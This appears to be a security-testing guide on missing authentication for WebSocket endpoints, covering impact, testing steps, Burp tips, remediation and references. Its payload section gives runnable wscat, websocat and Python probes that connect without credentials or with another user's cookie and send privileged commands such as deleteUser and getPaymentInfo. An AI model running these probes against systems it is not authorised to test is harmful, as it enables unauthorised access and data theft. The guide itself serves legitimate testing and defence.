# Lack of Authentication on WebSocket

## Overview
Many applications implement authentication for their HTTP endpoints but fail to enforce equivalent authentication controls on WebSocket connections. This occurs because WebSocket authentication is not handled automatically by the browser — unlike HTTP requests where `Authorization` headers and cookies are included automatically, WebSocket authentication must be explicitly implemented. If authentication is absent or only performed at connection time without re-validation, attackers can access real-time data streams, perform privileged actions, or manipulate application state without valid credentials.

## How It Works
WebSocket connections are established via an HTTP upgrade request. If the server does not verify that the client holds a valid session (via cookie, Bearer token, or a custom auth token in the handshake), any client — authenticated or not — can connect. Even when authentication is checked at connection time, the absence of per-message authorization means a compromised token or session fixation can grant long-lived unauthorized access. In some cases, the WebSocket endpoint is entirely unauthenticated because the developer assumed the client-side UI would prevent unauthorized access.

## Impact
- Unauthenticated access to real-time data (messages, events, financial feeds)
- Performing privileged actions (admin commands, user management, data modification) as an anonymous user
- Information disclosure of other users' data if the endpoint serves broadcast data
- Account enumeration and user data harvesting
- Manipulation of application state (e.g., in collaborative editing or gaming applications)
- Bypass of payment or access controls implemented in HTTP endpoints

## Where to Look
- WebSocket endpoints that handle administrative functions
- Chat or messaging endpoints
- Real-time dashboard feeds
- Game servers with WebSocket control channels
- API WebSocket endpoints without `Authorization` header requirements
- Endpoints where the cookie is set only for the HTTP session and not checked on WebSocket upgrade
- WebSocket connections established before the user completes authentication

## Testing Steps
1. Browse the application while authenticated and note all WebSocket connections in Browser DevTools (Network > WS).
2. Copy the full WebSocket upgrade request from Burp's WebSocket history.
3. Remove or blank the session cookie from the handshake request and resend:
   ```http
   GET /ws HTTP/1.1
   Host: target.com
   Cookie:   <-- cleared
   Upgrade: websocket
   ```
4. If the server responds with 101, the endpoint lacks authentication.
5. Use `wscat` or `websocat` without any credentials:
   ```bash
   wscat -c wss://target.com/ws
   ```
6. After connecting, send common message types and observe whether data is returned.
7. Test if only certain messages require authentication by sending commands that should be privileged.
8. Check if the authentication token is transmitted in the URL query string (insecure):
   `wss://target.com/ws?token=abc123` — URL is often logged.
9. Test for session fixation: set a token before auth, complete auth, check if pre-auth WS connection gains access.
10. Review whether WebSocket connections are terminated when the associated HTTP session expires.

## Payloads / Techniques

Test without credentials using wscat:
```bash
# Test unauthenticated connection
wscat -c wss://target.com/ws
# Then type messages and observe responses

# Test with a different user's cookie
wscat -c wss://target.com/ws -H "Cookie: session=other_user_session"
```

Test with websocat (more flexible):
```bash
# No auth
websocat wss://target.com/ws

# With custom headers
websocat -H "Authorization: Bearer invalidtoken" wss://target.com/ws

# Interactive mode
websocat --text wss://target.com/ws
```

Python script to test auth:
```python
import websocket
import json

def test_no_auth(url):
    print(f"[*] Testing unauthenticated access to {url}")
    try:
        ws = websocket.create_connection(url)  # no cookies/headers
        print("[VULNERABLE] Connected without authentication!")
        
        # Send common message types
        for msg in [
            '{"action": "getUsers"}',
            '{"action": "getMessages"}',
            '{"type": "subscribe", "channel": "admin"}',
            '{"cmd": "list"}',
        ]:
            ws.send(msg)
            try:
                response = ws.recv()
                print(f"Response to {msg}: {response[:200]}")
            except:
                pass
        ws.close()
    except Exception as e:
        print(f"[BLOCKED] Connection failed: {e}")

test_no_auth('wss://target.com/ws')
```

Testing for token in URL (insecure pattern):
```bash
# If token is in URL, extract from logs, Referer headers, browser history
wscat -c "wss://target.com/ws?access_token=LEAKED_TOKEN"
```

Testing privileged actions after unauthenticated connection:
```bash
wscat -c wss://target.com/ws
# Once connected, try:
> {"action": "getAdminUsers"}
> {"action": "deleteUser", "userId": 1}
> {"action": "getPaymentInfo"}
> {"type": "admin", "cmd": "restart"}
```

Testing if long-lived WS connection survives session logout:
```python
import websocket, time, requests

# Step 1: Authenticate and get session
session = requests.Session()
session.post('https://target.com/login', data={'user': 'victim', 'pass': 'pass'})
cookies = session.cookies.get_dict()

# Step 2: Open WebSocket with authenticated session
ws = websocket.create_connection('wss://target.com/ws', 
    header=[f"Cookie: session={cookies.get('session', '')}"])
print("[*] WS connected while authenticated")

# Step 3: Logout via HTTP
session.get('https://target.com/logout')
print("[*] Logged out via HTTP")

# Step 4: Try to use the WebSocket after logout
time.sleep(2)
ws.send('{"action": "getProfile"}')
resp = ws.recv()
print(f"[*] Response after logout: {resp}")
# If data returned — session not revoked on WebSocket
```

## Burp Suite Tips
- In **WebSockets history**, right-click a handshake and send to Repeater — modify/remove the `Cookie` header to test auth.
- Use **Burp's WebSocket message editor** to send arbitrary messages to an unauthenticated connection and observe responses.
- The **CSWSH / WebSocket Security** scanner in Burp Pro flags unauthenticated WebSocket endpoints.
- Use **Proxy > Intercept > WebSockets** to intercept and modify individual WebSocket frames.
- Set up a **session handling rule** that replaces the session cookie with a blank value to systematically test all WebSocket endpoints.

## Tools
- Burp Suite — WebSocket history and Repeater
- wscat (npm install -g wscat) — CLI WebSocket client
- websocat — advanced CLI WebSocket client with scripting
- Python websocket-client — `pip install websocket-client`
- OWASP ZAP WebSocket fuzzer
- WSSiP (WebSocket Man-in-the-Middle proxy) — real-time WebSocket inspection

## Remediation
- Validate authentication on every WebSocket connection attempt by checking the session cookie or Bearer token during the HTTP upgrade handshake.
- Do not rely on obscurity of the WebSocket URL — always enforce authentication.
- Use per-message authentication when long-lived connections are required (include an auth token in every message or in the first handshake message).
- Revoke WebSocket connections when the associated HTTP session expires or the user logs out.
- Do not pass authentication tokens in the URL query string — use handshake headers or the WebSocket sub-protocol.
- Implement authorization checks on the server for every message action, not just at connection time.
- Log all WebSocket connections with IP, origin, and user identity for anomaly detection.

## References
https://portswigger.net/web-security/websockets
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_for_WebSockets_Security_Flaws
https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websockets
https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_servers
